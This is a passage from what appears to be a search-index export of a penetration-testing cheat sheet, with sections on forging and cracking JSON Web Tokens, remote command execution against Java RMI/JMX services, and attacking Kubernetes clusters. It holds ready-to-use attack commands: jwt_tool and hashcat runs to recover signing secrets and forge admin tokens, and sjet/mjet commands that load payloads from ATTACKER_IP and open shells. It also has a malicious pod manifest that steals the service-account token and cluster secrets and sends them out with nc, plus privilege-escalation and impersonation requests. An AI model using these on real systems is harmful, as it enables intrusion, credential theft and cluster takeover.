\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a (stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0 ``` Convert signature (Hex to \"base64 URL\") powershell $ python2 -c \"exec(\\\"import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\\\")\" Add signature to edited payload powershell [HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA","title":"JWT Signature - RS256 to HS256"},{"location":"JSON%20Web%20Token/#breaking-jwts-secret","text":"Encode/Decode JWT with the secret. import jwt encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256') # encode with 'secret' encoded = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE\" jwt.decode(encoded, 'Sn1f', algorithms=['HS256']) # decode with 'Sn1f' as the secret key # result {u'admin': True, u'sub': u'1234567890', u'name': u'John Doe'}","title":"Breaking JWT's secret"},{"location":"JSON%20Web%20Token/#jwt-tool","text":"First, bruteforce the \"secret\" key used to compute the signature. git clone https://github.com/ticarpi/jwt_tool python3 -m pip install termcolor cprint pycryptodomex requests python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C \\ \\ \\ \\ \\ \\ \\__ | | \\ |\\__ __| \\__ __| | | | \\ | | | \\ \\ | | \\ | | | __ \\ __ \\ | \\ | _ | | | | | | | | | | / \\ | | | | | | | | \\ | / \\ | | |\\ |\\ | | \\______/ \\__/ \\__| \\__| \\__| \\______/ \\______/ \\__| Version 2.2.2 \\______| @ticarpi Original JWT: [+] secret is the CORRECT key! You can tamper/fuzz the token contents (-T/-I) and sign it using: python3 jwt_tool.py [options here] -S HS256 -p \"secret\" Then edit the field inside the JSON Web Token. Current value of role is: user Please enter new value and hit ENTER > admin [1] sub = 1234567890 [2] role = admin [3] iat = 1516239022 [0] Continue to next step Please select a field number: (or 0 to Continue) > 0 Finally, finish the token by signing it with the previously retrieved \"secret\" key. Token Signing: [1] Sign token with known key [2] Strip signature from token vulnerable to CVE-2015-2951 [3] Sign with Public Key bypass vulnerability [4] Sign token with key file Please select an option from above (1-4): > 1 Please enter the known key: > secret Please enter the key length: [1] HMAC-SHA256 [2] HMAC-SHA384 [3] HMAC-SHA512 > 1 Your new forged token: [+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic [+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic Recon: python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw Scanning: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -M pb Exploitation: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -X i -I -pc name -pv admin Fuzzing: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -I -hc kid -hv custom_sqli_vectors.txt Review: python3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -X i -I -pc name -pv admin","title":"JWT tool"},{"location":"JSON%20Web%20Token/#jwt-cracker","text":"git clone https://github.com/brendan-rius/c-jwt-cracker ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE Secret is \"Sn1f\"","title":"JWT cracker"},{"location":"JSON%20Web%20Token/#hashcat","text":"Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - src /hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret","title":"Hashcat"},{"location":"JSON%20Web%20Token/#cve","text":"CVE-2015-2951 - The alg=none signature-bypass vulnerability CVE-2016-10555 - The RS/HS256 public key mismatch vulnerability CVE-2018-0114 - Key injection vulnerability CVE-2019-20933/CVE-2020-28637 - Blank password vulnerability CVE-2020-28042 - Null signature vulnerability","title":"CVE"},{"location":"JSON%20Web%20Token/#references","text":"Hacking JSON Web Token (JWT) - Hate_401 WebSec CTF - Authorization Token - JWT Challenge Privilege Escalation like a Boss - October 27, 2018 - janijay007 5 Easy Steps to Understanding JSON Web Token Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq Simple JWT hacking - @b1ack_h00d Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar HACKING JSON WEB TOKENS, FROM ZERO TO HERO WITHOUT EFFORT - Thu Feb 09 2017 - @pdp Write up \u2013 JRR Token \u2013 LeHack 2019 - 07/07/2019 - LAPHAZE JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017 JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020","title":"References"},{"location":"Java%20RMI/","text":"Java RMI The attacker can host a MLet file and instruct the JMX service to load MBeans from the remote host. Summary Exploitation Requirements Detection Remote Command Execution References Exploitation Requirements Jython The JMX server can connect to a http service that is controlled by the attacker JMX authentication is not enabled Detection $ nmap -sV --script \"rmi-dumpregistry or rmi-vuln-classloader\" -p TARGET_PORT TARGET_IP -Pn -v 1089/tcp open java-rmi Java RMI | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution. | rmi-dumpregistry: | jmxrmi | javax.management.remote.rmi.RMIServerImpl_Stub Remote Command Execution The attack involves the following steps: * Starting a web server that hosts the MLet and a JAR file with the malicious MBeans * Creating a instance of the MBean javax.management.loading.MLet on the target server, using JMX * Invoking the \"getMBeansFromURL\" method of the MBean instance, passing the webserver URL as parameter. The JMX service will connect to the http server and parse the MLet file. * The JMX service downloads and loades the JAR files that were referenced in the MLet file, making the malicious MBean available over JMX. * The attacker finally invokes methods from the malicious MBean. Exploit the JMX using sjet or mjet jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000 jython sjet.py TARGET_IP TARGET_PORT super_secret command \"ls -la\" jython sjet.py TARGET_IP TARGET_PORT super_secret shell jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 \"touch /tmp/xxx\" jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000 jython mjet.py TARGET_IP TARGET_PORT command super_secret \"whoami\" jython mjet.py TARGET_IP TARGET_PORT command super_secret shell References ATTACKING RMI BASED JMX SERVICES - HANS-MARTIN M\u00dcNCH - 28 APR 2019 JMX RMI \u2013 MULTIPLE APPLICATIONS RCE - Red Timmy Security - 26th March 2019","title":"Java RMI"},{"location":"Java%20RMI/#java-rmi","text":"The attacker can host a MLet file and instruct the JMX service to load MBeans from the remote host.","title":"Java RMI"},{"location":"Java%20RMI/#summary","text":"Exploitation Requirements Detection Remote Command Execution References","title":"Summary"},{"location":"Java%20RMI/#exploitation","text":"","title":"Exploitation"},{"location":"Java%20RMI/#requirements","text":"Jython The JMX server can connect to a http service that is controlled by the attacker JMX authentication is not enabled","title":"Requirements"},{"location":"Java%20RMI/#detection","text":"$ nmap -sV --script \"rmi-dumpregistry or rmi-vuln-classloader\" -p TARGET_PORT TARGET_IP -Pn -v 1089/tcp open java-rmi Java RMI | rmi-vuln-classloader: | VULNERABLE: | RMI registry default configuration remote code execution vulnerability | State: VULNERABLE | Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution. | rmi-dumpregistry: | jmxrmi | javax.management.remote.rmi.RMIServerImpl_Stub","title":"Detection"},{"location":"Java%20RMI/#remote-command-execution","text":"The attack involves the following steps: * Starting a web server that hosts the MLet and a JAR file with the malicious MBeans * Creating a instance of the MBean javax.management.loading.MLet on the target server, using JMX * Invoking the \"getMBeansFromURL\" method of the MBean instance, passing the webserver URL as parameter. The JMX service will connect to the http server and parse the MLet file. * The JMX service downloads and loades the JAR files that were referenced in the MLet file, making the malicious MBean available over JMX. * The attacker finally invokes methods from the malicious MBean. Exploit the JMX using sjet or mjet jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000 jython sjet.py TARGET_IP TARGET_PORT super_secret command \"ls -la\" jython sjet.py TARGET_IP TARGET_PORT super_secret shell jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 \"touch /tmp/xxx\" jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000 jython mjet.py TARGET_IP TARGET_PORT command super_secret \"whoami\" jython mjet.py TARGET_IP TARGET_PORT command super_secret shell","title":"Remote Command Execution"},{"location":"Java%20RMI/#references","text":"ATTACKING RMI BASED JMX SERVICES - HANS-MARTIN M\u00dcNCH - 28 APR 2019 JMX RMI \u2013 MULTIPLE APPLICATIONS RCE - Red Timmy Security - 26th March 2019","title":"References"},{"location":"Kubernetes/","text":"Kubernetes Kubernetes is an open-source container-orchestration system for automating application deployment, scaling, and management. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation. Summary Tools Container Environment Information Gathering RBAC Configuration Listing Secrets Access Any Resource or Verb Pod Creation Privilege to Use Pods/Exec Privilege to Get/Patch Rolebindings Impersonating a Privileged Account Privileged Service Account Token Interesting endpoints to reach API addresses that you should know References Tools kubeaudit - Audit Kubernetes clusters against common security concerns kubesec.io - Security risk analysis for Kubernetes resources kube-bench - Checks whether Kubernetes is deployed securely by running CIS Kubernetes Benchmark kube-hunter - Hunt for security weaknesses in Kubernetes clusters katacoda - Learn Kubernetes using interactive broser-based scenarios kubescape - Automate Kubernetes cluster scans to identify security issues Container Environment Containers within a Kubernetes cluster automatically have certain information made available to them through their container environment . Additional information may have been made available through the volumes, environment variables, or the downward API, but this section covers only what is made available by default. Service Account Each Kubernetes pod is assigned a service account for accessing the Kubernetes API. The service account, in addition to the current namespace and Kubernetes SSL certificate, are made available via a mounted read-only volume: /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/ca.crt If the kubectl utility is installed in the container, it will use this service account automatically and will make interacting with the cluster much easier. If not, the contents of the token and namespace files can be used to make HTTP API requests directly. Environment Variables The KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT environment variables are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node. If kubectl is installed, it will use these values automatically. If not, the values can be used to determine the correct IP address to send API requests to. KUBERNETES_SERVICE_HOST=192.168.154.228 KUBERNETES_SERVICE_PORT=443 Additionally, environment variables are automatically created for each Kubernetes service running in the current namespace when the container was created. The environment variables are named using two patterns: A simplified {SVCNAME}_SERVICE_HOST and {SVCNAME}_SERVICE_PORT contain the IP address and default port number for the service. A Docker links collection of variables named {SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR} for each port the service exposes. For example, all of the following environment variables would be available if a redis-master service were running with port 6379 exposed: REDIS_MASTER_SERVICE_HOST=10.0.0.11 REDIS_MASTER_SERVICE_PORT=6379 REDIS_MASTER_PORT=tcp://10.0.0.11:6379 REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379 REDIS_MASTER_PORT_6379_TCP_PROTO=tcp REDIS_MASTER_PORT_6379_TCP_PORT=6379 REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11 Simulating kubectl API Requests Most containers within a Kubernetes cluster won't have the kubectl utility installed. If running the one-line kubectl installer within the container isn't an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by using kubectl locally to determine the correct API request to send from the container. Run the desired command at the maximum verbosity level using kubectl -v9 ... The output will include HTTP API endpoint URL, the request body, and an example curl command. Replace the endpoint URL's hostname and port with the KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT values from the container's environment variables. Replace the masked \"Authorization: Bearer\" token value with the contents of /var/run/secrets/kubernetes.io/serviceaccount/token from the container. If the request had a body, ensure the \"Content-Type: application/json\" header is included and send the request body using the customary method (for curl, use the --data flag). For example, this output was used to create the Service Account Permissions request: # NOTE: only the Authorization and Content-Type headers are required. The rest can be omitted. $ kubectl -v9 auth can-i --list I1028 18:58:38.192352 76118 loader.go:359] Config loaded from file /home/example/.kube/config I1028 18:58:38.193847 76118 request.go:942] Request Body: {\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}} I1028 18:58:38.193912 76118 round_trippers.go:419] curl -k -v -XPOST -H \"Accept: application/json, */*\" -H \"Content-Type: application/json\" -H \"User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1\" 'https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews' I1028 18:58:38.295722 76118 round_trippers.go:438] POST https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 201 Created in 101 milliseconds I1028 18:58:38.295760 76118 round_trippers.go:444] Response Headers: ... Information Gathering Service Account Permissions The default service account may have been granted additional permissions that make cluster compromise or lateral movement easier. The following can be used to determine the service account's permissions: # Namespace-level permissions using kubectl kubectl auth can-i --list # Cluster-level permissions using kubectl kubectl auth can-i --list --namespace=kube-system # Permissions list using curl NAMESPACE=$(cat \"/var/run/secrets/kubernetes.io/serviceaccount/namespace\") # For cluster-level, use NAMESPACE=\"kube-system\" instead MASTER_URL=\"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\" TOKEN=$(cat \"/var/run/secrets/kubernetes.io/serviceaccount/token\") curl \"${MASTER_URL}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\" \\ --cacert \"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\" \\ --header \"Authorization: Bearer ${TOKEN}\" \\ --header \"Content-Type: application/json\" \\ --data '{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"'${NAMESPACE}'\"}}' Secrets, ConfigMaps, and Volumes Kubernetes provides Secrets and ConfigMaps as a way to load configuration into containers at runtime. While they may not lead directly to whole cluster compromise, the information they contain can lead to individual service compromise or enable lateral movement within a cluster. From a container perspective, Kubernetes Secrets and ConfigMaps are identical. Both can be loaded into environment variables or mounted as volumes. It's not possible to determine if an environment variable was loaded from a Secret/ConfigMap, so each environment variable will need to be manually inspected. When mounted as a volume, Secrets/ConfigMaps are always mounted as read-only tmpfs filesystems. You can quickly find these with grep -F \"tmpfs ro\" /etc/mtab . True Kubernetes Volumes are typically used as shared storage or for persistent storage across restarts. These are typically mounted as ext4 filesystems and can be identified with grep -wF \"ext4\" /etc/mtab . Privileged Containers Kubernetes supports a wide range of security contexts for container and pod execution. The most important of these is the \"privileged\" security policy which makes the host node's devices available under the container's /dev directory. This means having access to the host's Docker socket file (allowing arbitrary container actions) in addition to the host's root disks (which can be used to escape the container entirely). While there is no official way to check for privileged mode from within a container, checking if /dev/kmsg exists will usually suffice. RBAC Configuration Listing Secrets An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in \"kube-system\" namespace. curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/ Access Any Resource or Verb resources: - '*' verbs: - '*' Pod Creation Check your right with kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml . Then create a malicious pod.yaml file. apiVersion: v1 kind: Pod metadata: name: alpine namespace: kube-system spec: containers: - name: alpine image: alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true Then kubectl apply -f malicious-pod.yaml Privilege to Use Pods/Exec kubectl exec -it <POD NAME> -n <PODS NAMESPACE> \u2013- sh Privilege to Get/Patch Rolebindings The purpose of this JSON file is to bind the admin \"CluserRole\" to the compromised service account. Create a malicious RoleBinging.json file. { \"apiVersion\": \"rbac.authorization.k8s.io/v1\", \"kind\": \"RoleBinding\", \"metadata\": { \"name\": \"malicious-rolebinding\", \"namespcaes\": \"default\" }, \"roleRef\": { \"apiGroup\": \"*\", \"kind\": \"ClusterRole\", \"name\": \"admin\" }, \"subjects\": [ { \"kind\": \"ServiceAccount\", \"name\": \"sa-comp\" \"namespace\": \"default\" } ] } curl -k -v -X POST -H \"Authorization: Bearer <JWT TOKEN>\" -H \"Content-Type: application/json\" https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings -d @malicious-RoleBinging.json curl -k -v -X POST -H \"Authorization: Bearer <COMPROMISED JWT TOKEN>\" -H \"Content-Type: application/json\" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret Impersonating a Privileged Account curl -k -v -XGET -H \"Authorization: Bearer <JWT TOKEN (of the impersonator)>\" -H \"Impersonate-Group: system:masters\" -H \"Impersonate-User: null\" -H \"Accept: application/json\" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/ Privileged Service Account Token $ cat /run/secrets/kubernetes.io/serviceaccount/token $ curl -k -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/ Interesting endpoints to reach # List Pods curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/default/pods/ # List secrets curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/default/secrets/ # List deployments curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/deployments # List daemonsets curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets API addresses that you should know (External network visibility) cAdvisor curl -k https://<IP Address>:4194 Insecure API server curl -k https://<IP Address>:8080 Secure API Server curl -k https://<IP Address>:(8|6)443/swaggerapi curl -k https://<IP Address>:(8|6)443/healthz curl -k https://<IP Address>:(8|6)443/api/v1 etcd API curl -k https://<IP address>:2379 curl -k https://<IP address>:2379/version etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only Kubelet API curl -k https://<IP address>:10250 curl -k https://<IP address>:10250/metrics curl -k https://<IP address>:10250/pods kubelet (Read only) curl -k https://<IP Address>:10255 http://<external-IP>:10255/pods References Kubernetes Pentest Methodology Part 1 - by Or Ida on August 8, 2019 Kubernetes Pentest Methodology Part 2 - by Or Ida on September 5, 2019 Kubernetes Pentest Methodology Part 3 - by Or Ida on November 21, 2019 Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon Kubernetes Pod Privilege Escalation","title":"Kubernetes"},{"location":"Kubernetes/#kubernetes","text":"Kubernetes is an open-source container-orchestration system for automating application deployment, scaling, and management. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation.","title":"Kubernetes"},{"location":"Kubernetes/#summary","text":"Tools Container Environment Information Gathering RBAC Configuration Listing Secrets Access Any Resource or Verb Pod Creation Privilege to Use Pods/Exec Privilege to Get/Patch Rolebindings Impersonating a Privileged Account Privileged Service Account Token Interesting endpoints to reach API addresses that you should know References","title":"Summary"},{"location":"Kubernetes/#tools","text":"kubeaudit - Audit Kubernetes clusters against common security concerns kubesec.io - Security risk analysis for Kubernetes resources kube-bench - Checks whether Kubernetes is deployed securely by running CIS Kubernetes Benchmark kube-hunter - Hunt for security weaknesses in Kubernetes clusters katacoda - Learn Kubernetes using interactive broser-based scenarios kubescape - Automate Kubernetes cluster scans to identify security issues","title":"Tools"},{"location":"Kubernetes/#container-environment","text":"Containers within a Kubernetes cluster automatically have certain information made available to them through their container environment . Additional information may have been made available through the volumes, environment variables, or the downward API, but this section covers only what is made available by default.","title":"Container Environment"},{"location":"Kubernetes/#service-account","text":"Each Kubernetes pod is assigned a service account for accessing the Kubernetes API. The service account, in addition to the current namespace and Kubernetes SSL certificate, are made available via a mounted read-only volume: /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/ca.crt If the kubectl utility is installed in the container, it will use this service account automatically and will make interacting with the cluster much easier. If not, the contents of the token and namespace files can be used to make HTTP API requests directly.","title":"Service Account"},{"location":"Kubernetes/#environment-variables","text":"The KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT environment variables are automatically provided to the container. They contain the IP address and port number of the Kubernetes master node. If kubectl is installed, it will use these values automatically. If not, the values can be used to determine the correct IP address to send API requests to. KUBERNETES_SERVICE_HOST=192.168.154.228 KUBERNETES_SERVICE_PORT=443 Additionally, environment variables are automatically created for each Kubernetes service running in the current namespace when the container was created. The environment variables are named using two patterns: A simplified {SVCNAME}_SERVICE_HOST and {SVCNAME}_SERVICE_PORT contain the IP address and default port number for the service. A Docker links collection of variables named {SVCNAME}_PORT_{NUM}_{PROTOCOL}_{PROTO|PORT|ADDR} for each port the service exposes. For example, all of the following environment variables would be available if a redis-master service were running with port 6379 exposed: REDIS_MASTER_SERVICE_HOST=10.0.0.11 REDIS_MASTER_SERVICE_PORT=6379 REDIS_MASTER_PORT=tcp://10.0.0.11:6379 REDIS_MASTER_PORT_6379_TCP=tcp://10.0.0.11:6379 REDIS_MASTER_PORT_6379_TCP_PROTO=tcp REDIS_MASTER_PORT_6379_TCP_PORT=6379 REDIS_MASTER_PORT_6379_TCP_ADDR=10.0.0.11","title":"Environment Variables"},{"location":"Kubernetes/#simulating-kubectl-api-requests","text":"Most containers within a Kubernetes cluster won't have the kubectl utility installed. If running the one-line kubectl installer within the container isn't an option, you may need to craft Kubernetes HTTP API requests manually. This can be done by using kubectl locally to determine the correct API request to send from the container. Run the desired command at the maximum verbosity level using kubectl -v9 ... The output will include HTTP API endpoint URL, the request body, and an example curl command. Replace the endpoint URL's hostname and port with the KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT values from the container's environment variables. Replace the masked \"Authorization: Bearer\" token value with the contents of /var/run/secrets/kubernetes.io/serviceaccount/token from the container. If the request had a body, ensure the \"Content-Type: application/json\" header is included and send the request body using the customary method (for curl, use the --data flag). For example, this output was used to create the Service Account Permissions request: # NOTE: only the Authorization and Content-Type headers are required. The rest can be omitted. $ kubectl -v9 auth can-i --list I1028 18:58:38.192352 76118 loader.go:359] Config loaded from file /home/example/.kube/config I1028 18:58:38.193847 76118 request.go:942] Request Body: {\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}} I1028 18:58:38.193912 76118 round_trippers.go:419] curl -k -v -XPOST -H \"Accept: application/json, */*\" -H \"Content-Type: application/json\" -H \"User-Agent: kubectl/v1.14.10 (linux/amd64) kubernetes/f5757a1\" 'https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews' I1028 18:58:38.295722 76118 round_trippers.go:438] POST https://1.2.3.4:5678/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 201 Created in 101 milliseconds I1028 18:58:38.295760 76118 round_trippers.go:444] Response Headers: ...","title":"Simulating kubectl API Requests"},{"location":"Kubernetes/#information-gathering","text":"","title":"Information Gathering"},{"location":"Kubernetes/#service-account-permissions","text":"The default service account may have been granted additional permissions that make cluster compromise or lateral movement easier. The following can be used to determine the service account's permissions: # Namespace-level permissions using kubectl kubectl auth can-i --list # Cluster-level permissions using kubectl kubectl auth can-i --list --namespace=kube-system # Permissions list using curl NAMESPACE=$(cat \"/var/run/secrets/kubernetes.io/serviceaccount/namespace\") # For cluster-level, use NAMESPACE=\"kube-system\" instead MASTER_URL=\"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\" TOKEN=$(cat \"/var/run/secrets/kubernetes.io/serviceaccount/token\") curl \"${MASTER_URL}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews\" \\ --cacert \"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\" \\ --header \"Authorization: Bearer ${TOKEN}\" \\ --header \"Content-Type: application/json\" \\ --data '{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"'${NAMESPACE}'\"}}'","title":"Service Account Permissions"},{"location":"Kubernetes/#secrets-configmaps-and-volumes","text":"Kubernetes provides Secrets and ConfigMaps as a way to load configuration into containers at runtime. While they may not lead directly to whole cluster compromise, the information they contain can lead to individual service compromise or enable lateral movement within a cluster. From a container perspective, Kubernetes Secrets and ConfigMaps are identical. Both can be loaded into environment variables or mounted as volumes. It's not possible to determine if an environment variable was loaded from a Secret/ConfigMap, so each environment variable will need to be manually inspected. When mounted as a volume, Secrets/ConfigMaps are always mounted as read-only tmpfs filesystems. You can quickly find these with grep -F \"tmpfs ro\" /etc/mtab . True Kubernetes Volumes are typically used as shared storage or for persistent storage across restarts. These are typically mounted as ext4 filesystems and can be identified with grep -wF \"ext4\" /etc/mtab .","title":"Secrets, ConfigMaps, and Volumes"},{"location":"Kubernetes/#privileged-containers","text":"Kubernetes supports a wide range of security contexts for container and pod execution. The most important of these is the \"privileged\" security policy which makes the host node's devices available under the container's /dev directory. This means having access to the host's Docker socket file (allowing arbitrary container actions) in addition to the host's root disks (which can be used to escape the container entirely). While there is no official way to check for privileged mode from within a container, checking if /dev/kmsg exists will usually suffice.","title":"Privileged Containers"},{"location":"Kubernetes/#rbac-configuration","text":"","title":"RBAC Configuration"},{"location":"Kubernetes/#listing-secrets","text":"An attacker that gains access to list secrets in the cluster can use the following curl commands to get all secrets in \"kube-system\" namespace. curl -v -H \"Authorization: Bearer <jwt_token>\" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/","title":"Listing Secrets"},{"location":"Kubernetes/#access-any-resource-or-verb","text":"resources: - '*' verbs: - '*'","title":"Access Any Resource or Verb"},{"location":"Kubernetes/#pod-creation","text":"Check your right with kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml . Then create a malicious pod.yaml file. apiVersion: v1 kind: Pod metadata: name: alpine namespace: kube-system spec: containers: - name: alpine image: 